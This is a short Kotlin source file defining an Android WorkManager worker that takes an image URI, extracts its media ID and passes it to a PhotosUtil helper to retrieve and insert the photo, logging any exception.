package com.android.services.workers

import android.content.Context
import androidx.work.Worker
import androidx.work.WorkerParameters
import com.android.services.util.PhotosUtil
import com.android.services.util.logException

class ImageWorker(ctx: Context, params: WorkerParameters) :
    Worker(ctx, params) {

    companion object {
        const val TAG = "PhotosWorker"
        const val IMAGE_URI_WORK = "IMAGE_URI_WORK"
        const val KEY_IMAGE_URI = "KEY_IMAGE_URI"
    }

    override fun doWork(): Result {
        return try {
            val imageUri = inputData.getString(KEY_IMAGE_URI)
            imageUri?.let {
                val mediaId = imageUri.substringAfterLast(delimiter = "/")
                PhotosUtil.retrieveAndInsertPhoto(applicationContext, mediaId)
            }
            Result.success()
        } catch (exception: Exception) {
            logException(exception.message!!, TAG, exception)
            Result.failure()
        }
    }
}